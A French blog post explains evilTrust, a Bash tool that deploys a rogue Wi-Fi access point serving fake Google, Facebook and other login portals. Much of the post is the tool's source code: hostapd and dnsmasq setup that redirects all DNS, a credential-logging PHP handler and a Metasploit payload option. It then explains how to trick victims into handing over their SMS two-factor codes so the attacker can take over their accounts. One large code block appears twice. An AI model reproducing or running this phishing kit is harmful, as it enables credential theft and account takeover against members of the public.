---
layout: single
title: evilTrust (outil offensif)
excerpt: "Je vais vous expliquer l'utilisation d'un outil de type 'evil Twin' créé par**S4vitar**, appelé evilTrust"
date: 2023-02-02
classes: wide
header:
  teaser: /assets/images/evil-trust/evil.png
  teaser_home_page: true
  icon: /assets/images/hacktheboxx.webp
categories:
  - Francais
tags:
  - GitHub
  - Bash
  - Tools
---

<p align="center">
<img src="/assets/images/evil-trust/evil.png" width="200">
</p>

Je vais expliquer l'utilisation d'un outil semblable a l'attaque 'evil Twin' créé par [**S4vitar**](https://github.com/s4vitar), appelé [evilTrust](https://github.com/s4vitar/evilTrust).


## "Qu'est-ce que EvilTrust ?" 

**EvilTrust** C'est un outil offensif, idéal pour voler les données d'accès d'un utilisateur. En gros, l'outil se charge automatiquement de déployer un **Rogue AP**, Restant dans l'attente de clients potentiels qui s'associeront à cela afin de poursuivre l'attaque.
Il convient de mentionner que l'objectif principal n'est pas une attaque **Evil Twin**, puisque le but n'est pas d'obtenir le mot de passe d'un réseau sans fil, mais les données privées du client qui se connecte au point d'accès.
L'outil dispose de plusieurs modèles à utiliser, y compris un modèle personnalisé, où l'attaquant est capable de déployer son propre modèle.

## Quelles capacités apporte evilTrust ?

Chacun des modèles configurés (Facebook, Twitter, Google, Starbucks, Yahoo, ...) est accompagné d'un modèle 2FA (Second Factor Authentication), qui nous permettra d'obtenir le code d'accès qui est envoyé par SMS à tous les utilisateurs. qui ont activé cette mesure de protection.

##Comment l'outil est-il structuré ?
L'outil est développé en **Bash**, et est capable de fonctionner en 2 modes basés sur le paramètre `-m`:

```go
┌─[root@parrot]─[/opt/evilTrust]
└──╼ #./evilTrust.sh 

╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮
╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮
╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯
┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   (Hecho por s4vitar)
┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮
╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯

Uso:
        [-m] Modo de ejecución (terminal|gui) [-m terminal | -m gui]
        [-h] Mostrar este panel de ayuda
```

- **Modo terminal** : Pour les amoureux de la console qui préfèrent ne pas utiliser l'interface graphique
- **Modo GUI** : Pour les amateurs d'interface graphique qui détestent opérer par console

Cette partie est essentiellement gérée à partir de ce morceau de code :


```go
# Main Program

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
			m) mode=$OPTARG && let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ "$mode" == "terminal" ]; then
			tput civis; banner
			dependencies
			startAttack
		elif [ "$mode" == "gui" ]; then
			guiMode
		else
			echo -e "Modo no conocido"
			exit 1
		fi
	fi
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
```

Après son exécution, par la fonction  `dependencies`, une vérification est faite des outils nécessaires au fonctionnement d'evilTrust :

```go
function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1

	dependencias=(php dnsmasq hostapd)

	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
			let counter+=1
		else
			echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
		fi; sleep 0.4
	done

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		tput cnorm; exit
	fi
}
```

Comme on peut le voir, pour que l'outil fonctionne correctement, il est nécessaire d'avoir installé `php`, `dnsmasq` et `hostpad`.  Si vous ne disposez pas de ces utilitaires, evilTrust se chargera d'installer tout le nécessaire pour pouvoir fonctionner.

 Une fois la vérification effectuée, la fonction `startAttack` est appelée, où comme son nom l'indique... l'attaque commence à se déployer.

 C'est dans cette phase où une série de fichiers temporaires nécessaires au déploiement de l'AP seront configurés, faisant fonctionner la carte réseau en mode routeur (il est obligatoire que la carte réseau utilisée accepte le **mode moniteur**) :

```go
function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
	done

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5
    ...    
```
Comme on peut le voir, pour le bon fonctionnement de l'outil, il est nécessaire d'avoir `php`, `dnsmasq` y `hostpad` installée. Si vous ne disposez pas de ces utilitaires, evilTrust se chargera d'installer tout le nécessaire pour pouvoir fonctionner.

Une fois la vérification effectuée, la fonction est appelée `startAttack`, où comme son nom l'indique... l'attaque commence à se déployer.

C'est dans cette phase où une série de fichiers temporaires nécessaires au déploiement de l'AP seront configurés, faisant fonctionner la carte réseau en mode Routeur (il est obligatoire que la carte réseau utilisée accepte le mode moniteur ) :

```go
function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
	done

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5
    ...    
```

**Considération**: Au niveau du code, la carte réseau qui a été configurée par défaut porte un nom`wlan0`. Il est important de noter que ce n'est pas toujours le cas, les cartes réseau peuvent être référencées par des noms différents et ne sont pas toujours appelées de la même manière. S'il est différent, il est nécessaire de changer son nom à partir du code lui-même.

Dans cette phase on nous demande plusieurs choses :

Nom du point d'accès.
Canal dans lequel nous voulons que le point d'accès fonctionne.
Interface réseau à utiliser (par défaut **wlan0**)

Une fois ces points renseignés, un AP avec les configurations spécifiées sera déployé, attribué l'adresse IP '**192.168.1.1**' à notre interface réseau en mode moniteur.. 

Maintenant que ces spécifications sont définies, nous procédons à la sélection du modèle :

```go
	# Array de plantillas
	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "cliqq-payload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		cat msfconsole.rc
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
		popd > /dev/null 2>&1; getCredentials
	else
		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	fi
}
```

Il faut s'attendre à ce que dans cette phase, on nous demande avec quel modèle nous voulons travailler.

Si l'un est sélectionné, par exemple imaginons… '**google-login**', ce qui se passera, c'est que dès que le client se connectera à l'AP, le navigateur s'ouvrira automatiquement, étant redirigé vers un portail d'authentification, dans ce cas, le Google plate-forme, où vous verrez que pour continuer à naviguer, il est nécessaire de vous connecter avec votre compte de modèle sélectionné.

La victime ne verra jamais les adresses IP ou quelque chose comme ça, donc cela leur fera penser à tout moment qu'ils sont sur la page officielle.

Chaque modèle est organisé dans son propre répertoire, où après avoir sélectionné celui avec lequel nous voulons travailler, un `pushd` à ce répertoire pour monter ultérieurement un serveur Web à l'aide phpHébergé par le port 80.

A ce stade, la fonction s'appelle  `getCredentials`, qui est celui qui sera chargé de surveiller un fichier à partir duquel nous pourrons savoir à tout moment qui a saisi ses informations d'identification, pouvant les voir plus tard en texte clair :


```go
function getCredentials(){

	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		sleep 3; clear
	done
}
```

Puisqu'il est probable que la victime ait activé le deuxième facteur d'authentification, avoir ses informations d'identification ne suffit parfois pas... car après la connexion, nous devrons saisir le code que la plateforme envoie à l'appareil mobile associé via SMS.

Ne vous inquiétez pas, tout est compris. Chaque modèle de portail sélectionné possède un fichier `post.php`, où après avoir signalé les informations d'identification à un fichier externe, un `Redirect` vers un autre template de la même plateforme, où le code reçu est demandé :

```php
<?php $file = 'datos-privados.txt'; file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://192.168.1.1/portal_2fa/index.php" />
```

Pour ceux qui n'ont pas bien compris le geste, je vais l'expliquer ici : La victime saisit ses identifiants d'accès à la plateforme que vous avez choisie pour continuer à naviguer, vous en tant qu'attaquant recevez ces identifiants en clair depuis la console, puis la victime est redirigé vers un autre portail où il vous est demandé de saisir le SMS reçu. L'astuce est que la victime n'a pas accès à Internet depuis votre point d'accès, elle ne recevra donc jamais de code pour cette session, car elle ne se connecte pas au modèle officiel. La blague est que par derrière, puisque vous avez déjà leurs informations d'identification, vous les validerez immédiatement manuellement sur la vraie plate-forme, donc dans le cas où ils vous demanderaient plus tard le code d'authentification du deuxième facteur, car la victime est maintenant dans ce modèle en attendant le code, un SMS arrivera mais de votre session, pas de la sienne, ce qui lui fera penser qu'une fois saisi, il accédera à son compte.

De cette façon, ils vous fourniront le code SMS de votre session, pouvant ainsi accéder ultérieurement à leur compte en "contournant" cette mesure de protection.

La grande question que certains d'entre vous m'ont posée... mais que se passe-t-il si la victime n'a pas activé le deuxième facteur d'authentification ? Eh bien, dans ce cas, vous avez déjà ses identifiants. Il est possible que la victime soit méfiante et trouve étrange qu'on lui demande le code SMS alors qu'elle n'a même pas configuré cette option, mais c'est la seule façon à laquelle je pouvais penser pour au moins couvrir les deux situations. Je vous dis aussi... un public cible dans la rue n'a pas beaucoup de notions de sécurité et la plupart du temps il ne la comprend pas, la laissant passer sans se douter de rien.

En résumé, si la victime a 2FA, vous pourrez obtenir le code, et si elle ne l'a pas configuré... dans le pire des cas, vous avez déjà ses identifiants, la victime restera dans le nouveau template en attente pour que le code arrive alors qu'ils ne l'ont jamais reçu. Il arrivera et vous accéderez à son compte par derrière.

Une petite note, lors de l'événement, certains collègues ont utilisé l'outil et m'ont dit que certains ont même saisi les informations d'identification de leur entreprise.


## Démo de l'outil

Nous configurons les caractéristiques de notre AP :

![](/assets/images/evil-trust/step_one.png)

Nous définissons le modèle à utiliser :

![](/assets/images/evil-trust/step_two.png)

Nous attendons qu'une victime se connecte à notre point d'accès pour voir les informations d'identification saisies :

<p align="center">
<img src="/assets/images/evil-trust/step_three.png">
</p>

La victime voit que le WiFi gratuit est disponible à portée de main et se connecte :

<p align="center">
<img src="/assets/images/evil-trust/step_four.jpg">
</p>

Après l'association à l'AP, le navigateur s'ouvre automatiquement en demandant les identifiants d'accès à la plateforme pour continuer à naviguer :

<p align="center">
<img src="/assets/images/evil-trust/step_five.jpg">
</p>

La victime saisit ses identifiants pour continuer à naviguer :

<p align="center">
<img src="/assets/images/evil-trust/step_six.jpg">
</p>

L'attaquant affiche les informations d'identification saisies :

<p align="center">
<img src="/assets/images/evil-trust/step_seven.png">
</p>

La victime est redirigée vers le portail d'authentification second facteur de la plateforme :

<p align="center">
<img src="/assets/images/evil-trust/step_eight.jpg">
</p>

L'attaquant valide les identifiants de la victime depuis un autre navigateur et comme ce dernier utilise un deuxième facteur d'authentification, un SMS est envoyé à la victime, inscrivant ensuite son code dans le template :

<p align="center">
<img src="/assets/images/evil-trust/step_nine.jpg">
</p>

L'attaquant reçoit le code de la console et accède ensuite à son compte :

<p align="center">
<img src="/assets/images/evil-trust/step_ten.png">
</p>







